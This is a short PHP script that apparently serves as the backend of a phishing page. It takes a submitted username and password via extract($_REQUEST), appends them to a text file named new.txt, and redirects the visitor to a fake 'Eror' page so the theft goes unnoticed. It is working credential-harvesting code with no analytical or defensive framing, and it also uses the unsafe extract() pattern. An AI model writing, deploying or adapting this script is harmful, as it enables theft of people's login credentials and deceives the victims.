<?php

  extract($_REQUEST);

	$file=fopen('new.txt', 'a');
	fwrite($file, " :name :");
	fwrite($file, $username ."\n");
	fwrite($file, " ::");
	fwrite($file, " :Pass :");
	fwrite($file, $pass ."\n");
	fclose($file);
	header("location: Eror/index.html");
	exit;
?>